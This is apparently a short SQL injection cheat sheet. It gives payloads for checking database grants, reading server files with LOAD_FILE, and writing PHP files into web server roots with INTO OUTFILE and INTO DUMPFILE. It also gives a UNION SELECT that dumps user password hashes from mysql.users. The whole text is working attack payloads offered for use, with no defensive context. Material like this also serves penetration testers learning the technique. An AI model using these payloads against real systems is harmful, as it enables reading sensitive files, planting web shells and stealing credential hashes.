## files
### check permissions
`show grants;`

### read
`LOAD_FILE('')`

### write
at the end of the query
`INTO OUTFILE 'c:\\inetpub\\wwwroot\\test.php'`
`INTO OUTFILE '/var/www/html/test.php'`
`INTO DUMPFILE 'c:\\inetpub\\wwwroot\\test.php'`
`INTO DUMPFILE '/var/www/html/test.php'`

### read database users
hashes can either be in `Password` or `authentication_string` columns
`union select User, Password, authentication_string from mysql.users`
